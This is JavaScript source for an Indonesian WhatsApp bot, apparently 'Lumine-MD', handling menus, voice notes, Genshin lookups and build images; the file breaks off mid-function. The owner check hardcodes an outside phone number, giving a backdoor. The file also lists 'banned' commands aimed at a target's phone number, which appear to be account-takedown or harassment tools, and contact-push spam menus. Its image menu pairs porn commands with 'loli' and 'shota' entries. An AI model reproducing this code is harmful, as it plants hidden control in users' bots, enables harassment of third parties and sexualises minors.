module.exports = async (qyuunee, m, neekoi, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = prefa ? /^[.]/gi.test(body) ? body.match(/^[.]/gi)[0] : "" : prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const full_args = body.replace(command, '').slice(1).trim()
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await qyuunee.decodeJid(qyuunee.user.id)
const sender = m.key.fromMe ? (qyuunee.user.id.split(':')[0]+'@s.whatsapp.net' || qyuunee.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const isOwner = [botNumber, ...global.owner, '6289508082845@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(sender)
const groupMetadata = isGroup? await qyuunee.groupMetadata(m.chat).catch(e => {}) : ""
const groupName = isGroup? groupMetadata.subject : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const pwkdnwn = isGroup? await groupMetadata.participants : ""
const groupAdmins = isGroup? await pwkdnwn.filter(v => v.admin !== null).map(v => v.id) : ""
const groupMembers = isGroup? groupMetadata.participants : ""
const isGroupAdmins = isGroup? groupAdmins.includes(m.sender) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false
const isMedia = /image|video|sticker|audio/.test(mime)
const isImage = (m.type == 'imageMessage')
const reply = (teks) => {
qyuunee.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DON'T SPAM !!!`,"body": `👋🏻 Hai kak ${pushname}`, "previewType": "PHOTO","thumbnail": thumbqris,"sourceUrl": `https://ikankoi.my.id`}}}, { quoted: m})}

// Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
        if(time2 < "23:59:00"){
        var kataGw = '👋🏻 Hai Haii.. Selamat Malam Buat Kamu Yang Terang Seperti Rembulan, Anjass.. Jangan Tidur Malem² Yaa, Have A Nice Dream 😋'
        }
        if(time2 < "18:00:00"){
        var kataGw = '👋🏻 Hai Haii, Selamat Sore 🌇 Warga Grup, Jangan Lupa Refreshing Yaa, Biar Kamu Ga Puyeng Kayak Aku Ehehehe :3'
        }
        if(time2 < "15:00:00"){
        var kataGw = '🕑 Jam Segini Emang Lagi Haus²nya, Tapi Harus Tetap Semangattt 😁'
        }
        if(time2 < "10:00:00"){
        var kataGw = '👋🏻 Hai Haii, Good Morning Semuanya, Selamat Beraktifitas Yaa.. Semangattt 🌹'
        }
        if(time2 < "06:00:00"){
        var kataGw = '👀 Hai Kamu! Iyaa Kamu!!.. Jangan Lupa Solat Subuhnya Buat Yang Ber-Agama Islam 😊'
        }
        if(time2 < "03:00:00"){
        var kataGw = '👋🏻 Hai Haii, Cuma Mau Ngingetin Nih.. Sekarang Udah Tengah Malam 🌃, Kamu Jangan Bergadang Ya.. Gak Baik Loh Buat Kesehatan :3'
        }
        
const pickRandom = (arr) => {
			return arr[Math.floor(Math.random() * arr.length)]
		}

// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return qyuunee.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

// Database
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const vnnya = JSON.parse(fs.readFileSync('./all/database/vnnya.json'))

// Get Database
const isContacts = contacts.includes(sender)

// Jangan Di Ubah Tar Error
try {
ppuser = await qyuunee.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
try {
ppgroup = await qyuunee.profilePictureUrl(m.chat, 'image')
} catch {
ppgroup = 'https://i.ibb.co/s2KvYYf/20230524-060103.png'
}

// Jangan Di Ubah
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await qyuunee.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await qyuunee.getName(i + '@s.whatsapp.net')}\n
FN:${await qyuunee.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:palsu8877@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://chat.whatsapp.com/B9jLTt3i4DfIvRs94fwgh0\n
item3.X-ABLabel:Grup WangSaff\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

for (let anju of vnnya) {
            if (budy.includes(anju)) {
                let buffer = qyuunee.sendMessage(m.chat, { audio: fs.readFileSync(`./mp3/${anju}.mp3`), mentions: [sender], mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
            }
        }

const fowner = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "extendedTextMessage": {
            "text": ucapanWaktu,
            "title": ``,
            'jpegThumbnail': thumb,
        }
    }
}

const sendFileFromUrl = async (from, url, caption, options = {}) => {
		    let mime = '';
		    let res = await axios.head(url)
		    mime = res.headerd["content-type"]
		    let type = mime.split("/")[0]+"Message"
		    if (mime.split("/")[0] === "image") {
		       var img = await getBuffer(url)
		       return qyuunee.sendMessage(from, { image: img, caption: caption }, options)
		    } else if (mime.split("/")[0] === "video") {
		       var vid = await getBuffer(url)
		       return qyuunee.sendMessage(from, { video: vid, caption: caption }, options)
		    } else if (mime.split("/")[0] === "audio") {
		       var aud = await getBuffer(url)
		       return qyuunee.sendMessage(from, { audio: aud, mimetype: 'audio/mp3' }, options)
		    } else {
		       var doc = await getBuffer(url)
		       return qyuunee.sendMessage(from, { document: doc, mimetype: mime, caption: caption }, options)
		    }
		}
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
}

if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.includes("chat.whatsapp.com")) {
setTimeout(() => {
qyuunee.sendMessage(from, { text:`\`\`\`「 Detect Link 」\`\`\`\n\n@${sender.split("@")[0]} Maaf Link Yang Kamu Kirim Di Dalam Group Ini Akan Di Hapus Oleh Bot`, mentions: [sender]}, { quoted: m })
}, 1000)
setTimeout(() => {
qyuunee.sendMessage(from, { delete: m.key })
}, 2000)
}
}

if (m.message) {
qyuunee.readMessages([m.key])
}

switch (command) {
case 'menu': {
const owned = owner + "@s.whatsapp.net"
    let anu =`▧ 「 *I N F O  B O T* 」
    
   ☍ Creator : *@${owned.split("@")[0]}*
   ☍ Runtime : *${runtime(process.uptime())}*
   ☍ Mode Bot : *${qyuunee.public ? `Public Mode` : `Self Mode`}*

▧ 「 *I N F O  U S E R* 」

   ☍ Name : *${pushname}*
   ☍ Number : *${m.sender.split('@')[0]}*
   ☍ Status : *${isOwner ? "Owner 🥶" : "User ⭐"}*

▧ 「 *S U B - M E N U* 」
│ ◦ ${prefix}jadibotmenu ( *Tinggal Scan* )
│ ◦ ${prefix}usermenu ( *Khusus User* )
│ ◦ ${prefix}downmenu ( *Downloader* )
│ ◦ ${prefix}bannedmenu ( *Khusus Owner* )
│ ◦ ${prefix}randomimage ( *Random Foto* )
│ ◦ ${prefix}randomsticker ( *Random Sticker* )
│ ◦ ${prefix}randomtext ( *Random Text* )
│ ◦ ${prefix}pushkonmenu ( *Push Kontak* )
│ ◦ ${prefix}groupmenu ( *Group Settings* )
│ ◦ ${prefix}hoyomenu ( *Hoyoverse Guide* )
╰──────────────━`
qyuunee.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu}`,
        body: "Lumine-MD",
        thumbnailUrl: "https://telegra.ph/file/04baa850b00dec76de06c.jpg",
        sourceUrl: "https://chat.whatsapp.com/CjxuywuwOglE7p2tFBqdH3",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   qyuunee.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case "usermenu": {
const y1 = `▧ 「 *USER MENU* 」
│ ‣ ${prefix}ai
│ ‣ ${prefix}ping
│ ‣ ${prefix}donasi
│ ‣ ${prefix}payment
│ ‣ ${prefix}owner
│ ‣ ${prefix}remini
│ ‣ ${prefix}hd
│ ‣ ${prefix}qc
│ ‣ ${prefix}toptv
│ ‣ ${prefix}tourl
│ ‣ ${prefix}toimg
│ ‣ ${prefix}halah
│ ‣ ${prefix}hilih
│ ‣ ${prefix}huluh
│ ‣ ${prefix}heleh
│ ‣ ${prefix}holoh
│ ‣ ${prefix}tohuruf
│ ‣ ${prefix}styletext
│ ‣ ${prefix}sticker
│ ‣ ${prefix}ssweb
│ ‣ ${prefix}smeme
│ ‣ ${prefix}bass
│ ‣ ${prefix}blown
│ ‣ ${prefix}deep
│ ‣ ${prefix}earrape
│ ‣ ${prefix}fast
│ ‣ ${prefix}fat
│ ‣ ${prefix}nightcore
│ ‣ ${prefix}reverse
│ ‣ ${prefix}robot
│ ‣ ${prefix}slow
│ ‣ ${prefix}smooth
│ ‣ ${prefix}tupai
│ ‣ ${prefix}ebinary
│ ‣ ${prefix}dbinary
│ ‣ ${prefix}pinterest
╰──────────────━`
reply(y1)
}
break
case "randomimage": {
const y2 = `▧ 「 *RANDOM IMAGE* 」
│ ‣ ${prefix}china
│ ‣ ${prefix}indonesia
│ ‣ ${prefix}japan
│ ‣ ${prefix}korea
│ ‣ ${prefix}malaysia
│ ‣ ${prefix}thailand
│ ‣ ${prefix}vietnam
│ ‣ ${prefix}aesthetic
│ ‣ ${prefix}ahegao
│ ‣ ${prefix}akira
│ ‣ ${prefix}akiyama
│ ‣ ${prefix}ana
│ ‣ ${prefix}anjing
│ ‣ ${prefix}art2
│ ‣ ${prefix}ass
│ ‣ ${prefix}asuna
│ ‣ ${prefix}ayuzawa
│ ‣ ${prefix}bdsm
│ ‣ ${prefix}boneka
│ ‣ ${prefix}boruto
│ ‣ ${prefix}bts
│ ‣ ${prefix}cecan2
│ ‣ ${prefix}chiho
│ ‣ ${prefix}chitoge
│ ‣ ${prefix}cogan2
│ ‣ ${prefix}cosplay
│ ‣ ${prefix}cosplayloli
│ ‣ ${prefix}cosplaysagiri
│ ‣ ${prefix}cuckold
│ ‣ ${prefix}cum
│ ‣ ${prefix}cyber
│ ‣ ${prefix}darkjokes
│ ‣ ${prefix}deidara
│ ‣ ${prefix}doraemon
│ ‣ ${prefix}eba
│ ‣ ${prefix}elaina
│ ‣ ${prefix}emilia
│ ‣ ${prefix}ero
│ ‣ ${prefix}erza
│ ‣ ${prefix}exo
│ ‣ ${prefix}femdom
│ ‣ ${prefix}foot
│ ‣ ${prefix}freefire
│ ‣ ${prefix}gamewallpaper
│ ‣ ${prefix}gangbang
│ ‣ ${prefix}glasses
│ ‣ ${prefix}gremory
│ ‣ ${prefix}hekel
│ ‣ ${prefix}hentai
│ ‣ ${prefix}hestia
│ ‣ ${prefix}hijaber
│ ‣ ${prefix}hinata
│ ‣ ${prefix}husbu
│ ‣ ${prefix}inori
│ ‣ ${prefix}islamic
│ ‣ ${prefix}isuzu
│ ‣ ${prefix}itachi
│ ‣ ${prefix}itori
│ ‣ ${prefix}jahy
│ ‣ ${prefix}jeni
│ ‣ ${prefix}jiso
│ ‣ ${prefix}justina
│ ‣ ${prefix}kaga
│ ‣ ${prefix}kagura
│ ‣ ${prefix}kakasih
│ ‣ ${prefix}kaori
│ ‣ ${prefix}kartun
│ ‣ ${prefix}katakata
│ ‣ ${prefix}keneki
│ ‣ ${prefix}kotori
│ ‣ ${prefix}kpop
│ ‣ ${prefix}kucing
│ ‣ ${prefix}kurumi
│ ‣ ${prefix}lisa
│ ‣ ${prefix}loli
│ ‣ ${prefix}madara
│ ‣ ${prefix}masturbation
│ ‣ ${prefix}megumin
│ ‣ ${prefix}mikasa
│ ‣ ${prefix}mikey
│ ‣ ${prefix}miku
│ ‣ ${prefix}milf
│ ‣ ${prefix}minato
│ ‣ ${prefix}mobil
│ ‣ ${prefix}motor
│ ‣ ${prefix}mountain
│ ‣ ${prefix}naruto
│ ‣ ${prefix}neko1
│ ‣ ${prefix}neko2
│ ‣ ${prefix}nekonime
│ ‣ ${prefix}nezuko
│ ‣ ${prefix}onepiece
│ ‣ ${prefix}orgy
│ ‣ ${prefix}panties
│ ‣ ${prefix}pentol
│ ‣ ${prefix}pokemon
│ ‣ ${prefix}profil
│ ‣ ${prefix}programming
│ ‣ ${prefix}pubg
│ ‣ ${prefix}pussy
│ ‣ ${prefix}quotesyt
│ ‣ ${prefix}randblackpink
│ ‣ ${prefix}randomnime
│ ‣ ${prefix}randomnime2
│ ‣ ${prefix}rize
│ ‣ ${prefix}rose
│ ‣ ${prefix}ryujin
│ ‣ ${prefix}sagiri
│ ‣ ${prefix}sakura
│ ‣ ${prefix}sasuke
│ ‣ ${prefix}satanic
│ ‣ ${prefix}shina
│ ‣ ${prefix}shinka
│ ‣ ${prefix}shinomiya
│ ‣ ${prefix}shizuka
│ ‣ ${prefix}shota
│ ‣ ${prefix}tatasurya
│ ‣ ${prefix}technology
│ ‣ ${prefix}tejina
│ ‣ ${prefix}tentacles
│ ‣ ${prefix}thighs
│ ‣ ${prefix}toukachan
│ ‣ ${prefix}tsunade
│ ‣ ${prefix}waifu2
│ ‣ ${prefix}wallhp
│ ‣ ${prefix}wallml
│ ‣ ${prefix}wallnime2
│ ‣ ${prefix}yotsuba
│ ‣ ${prefix}yuki
│ ‣ ${prefix}yulibocil
│ ‣ ${prefix}yumeko
│ ‣ ${prefix}ppcouple
╰──────────────━`
reply(y2)
}
break
case "randomsticker": {
const y3 = `▧ 「 *RANDOM STICKER* 」
│ ‣ ${prefix}cry
│ ‣ ${prefix}kill
│ ‣ ${prefix}hug
│ ‣ ${prefix}pat
│ ‣ ${prefix}lick
│ ‣ ${prefix}kiss
│ ‣ ${prefix}bite
│ ‣ ${prefix}yeet
│ ‣ ${prefix}bully
│ ‣ ${prefix}bonk
│ ‣ ${prefix}wink
│ ‣ ${prefix}poke
│ ‣ ${prefix}nom
│ ‣ ${prefix}slap
│ ‣ ${prefix}smile
│ ‣ ${prefix}wave
│ ‣ ${prefix}awoo
│ ‣ ${prefix}blush
│ ‣ ${prefix}smug
│ ‣ ${prefix}glomp
│ ‣ ${prefix}happy
│ ‣ ${prefix}dance
│ ‣ ${prefix}cringe
│ ‣ ${prefix}cuddle
│ ‣ ${prefix}highfive
│ ‣ ${prefix}handhold
╰──────────────━`
reply(y3)
}
break
case "bannedmenu": {
const y4 = `▧ 「 *BANNED MENU* 」
│ ‣ ${prefix}call _nomor_
│ ‣ ${prefix}out _nomor_
│ ‣ ${prefix}verif _nomor_
│ ‣ ${prefix}bannedv1 _nomor_
│ ‣ ${prefix}bannedv2 _nomor_
│ ‣ ${prefix}bannedv3 _nomor_
│ ‣ ${prefix}bannedv4 _nomor_
│ ‣ ${prefix}bannedv5 _nomor_
│ ‣ ${prefix}bannedv6 _nomor_
│ ‣ ${prefix}unbannedv1 _nomor_
│ ‣ ${prefix}unbannedv2 _nomor_
│ ‣ ${prefix}unbannedv3 _nomor_
│ ‣ ${prefix}unbannedv4 _nomor_
│ ‣ ${prefix}unbannedv5 _nomor_
╰──────────────━

*Note : Awali Dengan +62 Lanjutkan Sesuai Nomor Target*`
reply(y4)
}
break
case "randomtext": {
const y8 = `▧ 「 *RANDOM TEXT* 」
│ ‣ ${prefix}bucin
│ ‣ ${prefix}ceritahoror
│ ‣ ${prefix}dare
│ ‣ ${prefix}faktaunix
│ ‣ ${prefix}fml
│ ‣ ${prefix}katabijak
│ ‣ ${prefix}katacinta
│ ‣ ${prefix}katagalau
│ ‣ ${prefix}katahacker
│ ‣ ${prefix}katailham
│ ‣ ${prefix}katasenja
│ ‣ ${prefix}katasindiran
│ ‣ ${prefix}motivasi
│ ‣ ${prefix}nickff
│ ‣ ${prefix}pantun
│ ‣ ${prefix}puisi
│ ‣ ${prefix}quotes
│ ‣ ${prefix}quotesanime
│ ‣ ${prefix}quotesislamic
│ ‣ ${prefix}quotespubg
│ ‣ ${prefix}truth
╰──────────────━`
reply(y8)
}
break
case "jadibotmenu": {
const y10 = `▧ 「 *JADIBOT MENU* 」
│ ‣ ${prefix}jadibot
│ ‣ ${prefix}stopjadibot
│ ‣ ${prefix}listjadibot
╰──────────────━`
reply(y10)
}
break
case "pushkonmenu": {
const y11 = `▧ 「 *PUSH KONTAK OTOMATIS* 」
│ ‣ ${prefix}cekidgc
│ ‣ ${prefix}pushkontakv1
│ ‣ ${prefix}pushkontakv2
│ ‣ ${prefix}savecontact
╰──────────────━`
reply(y11)
}
break
case "groupmenu": {
const y12 = `▧ 「 *GROUP MENU* 」
│ ‣ ${prefix}revoke
│ ‣ ${prefix}linkgroup
│ ‣ ${prefix}infogroup
│ ‣ ${prefix}antilink _on_
│ ‣ ${prefix}antilink _off_
│ ‣ ${prefix}add _nomor_
│ ‣ ${prefix}kick _nomor_
│ ‣ ${prefix}group _open_
│ ‣ ${prefix}group _close_
│ ‣ ${prefix}tagall _teks_
│ ‣ ${prefix}hidetag _teks_
│ ‣ ${prefix}promote _nomor_
│ ‣ ${prefix}demote _nomor_
│ ‣ ${prefix}setnamagroup _teks_
│ ‣ ${prefix}setdescgroup _teks_
╰──────────────━`
reply(y12)
}
break
case "downmenu": {
const y13 = `▧ 「 *DOWNLOADER* 」
│ ‣ ${prefix}play
│ ‣ ${prefix}ytmp3
│ ‣ ${prefix}ytmp4
│ ‣ ${prefix}ig / igdl
│ ‣ ${prefix}tiktok
│ ‣ ${prefix}tiktokmp3
│ ‣ ${prefix}mediafire
│ ‣ ${prefix}git / github
╰──────────────━`
reply(y13)
}
break
case "hoyomenu": {
const y14 = `▧ 「 *HOYOVERSE GUIDE* 」
│ ‣ ${prefix}enka
│ ‣ ${prefix}build / buildgi
╰──────────────━`
reply(y14)
}
break
case "donasi": case "payment": {
owned = `${owner}@s.whatsapp.net`
qyuunee.sendMessage(from, { image: thumbqris, mentions: [owned], caption: `[ PAYMENT ${nameGEDE} ]

OVO : ${ovo}
GOPAY : ${gopay}
SHOPEEPAY : ${shopeepay}
PULSA TRI : ${pulsatri}

*SS BUKTI TRANSFER, KIRIM KE WHATSAPP @${owned.split("@")[0]} !!*` }, { quoted: m })
}
break

case 'addvn':{
if (!isOwner) return reply(mess.only.owner)
            if (args.length < 1) return reply('Nama audionya apa')
            if (vnnya.includes(q)) return reply("Nama tersebut sudah di gunakan")
            let delb = await qyuunee.downloadAndSaveMediaMessage(quoted)
            vnnya.push(q)
            await fsx.copy(delb, `./mp3/${q}.mp3`)
            fs.writeFileSync('./all/database/vnnya.json', JSON.stringify(vnnya))
            fs.unlinkSync(delb)
            reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
        }
        break

        case 'delvn':{
            if (!isOwner) return reply(mess.only.owner)
            if (args.length < 1) return reply('Masukan query')
            if (!vnnya.includes(q)) return reply("Nama tersebut tidak ada di dalam data base")
            let wanu = vnnya.indexOf(q)
            vnnya.splice(wanu, 1)
            fs.writeFileSync('./all/database/vnnya.json', JSON.stringify(vnnya))
            fs.unlinkSync(`./mp3/${q}.mp3`)
            reply(`Sukses delete vn ${q}`)
        }
        break
        
        case 'listvn':{
            let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
            for (let x of vnnya) {
            teksooo += `│⭔ ${x}\n`
            }
            teksooo += `│\n└────────────⭓\n\n*Total ada : ${vnnya.length}*`
            reply(teksooo)
        }
        break

case 'enka':
            case 'profilgi':
			if (args.length == 0) return reply(`Example: ${prefix + command} 800000001`)
			axios.get(`https://enka.network/api/uid/${args[0]}?info`).then(({ data }) => {
				var caption = `▧「 *P R O F I L E  G E N S H I N* 」\n\n ‣ *Nickname* : *${data.playerInfo.nickname}*\n`
				caption += ` ‣ *Adventure Rank* : *${data.playerInfo.level}*\n`
				caption += ` ‣ *Signature* : *${data.playerInfo.signature}*\n`
				caption += ` ‣ *World Level* : *${data.playerInfo.worldLevel}*\n\n`
				caption += ` ‣ *Achievement* : *${data.playerInfo.finishAchievementNum}*\n`
				caption += ` ‣ *Abyss* : *Floor ${data.playerInfo.towerFloorIndex} Chamber ${data.playerInfo.towerLevelIndex}*\n\n`
				caption += `▧ *Mau Lebih Lengkap? Cek Disini :*\nhttps://enka.network/u/${args[0]}\n`
				reply(caption)
			})
			.catch(console.error)
			break

case 'buildgi':
			case 'build': {
            if (args.length == 0) return reply(`‣ *Example:* ${prefix + command} hutao\n\n‣ *List Character:* ${prefix + command} list`)
                if (args[0] === "albedo") {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Albedo_Sub DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'hutao') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Hu Tao_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'alhaitam') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Alhaitham_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'aloy') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Aloy_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Aloy_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                 } else if (args[0] === 'amber') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Amber_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Amber_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'itto') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Arataki Itto_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'baizhu') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Baizhu_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'barbara') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Barbara_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'beidou') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Beidou_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'bennet') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Bennett_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Bennett_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'candace') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Candace_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'chongyun') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Chongyun_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'collei') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Collei_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'cyno') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Cyno_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'dehya') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Dehya_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'diluc') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Diluc_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'diona') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Diona_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'dori') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Dori_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'eula') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Eula_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'faruzan') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Faruzan_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'fischl') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Fischl_Aggravate.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Fischl_Sub DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'ganyu') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Ganyu_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Ganyu_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'gorou') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Gorou_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'jean') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Jean_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kazuha') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kaedehara Kazuha_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kaeya') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kaeya_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
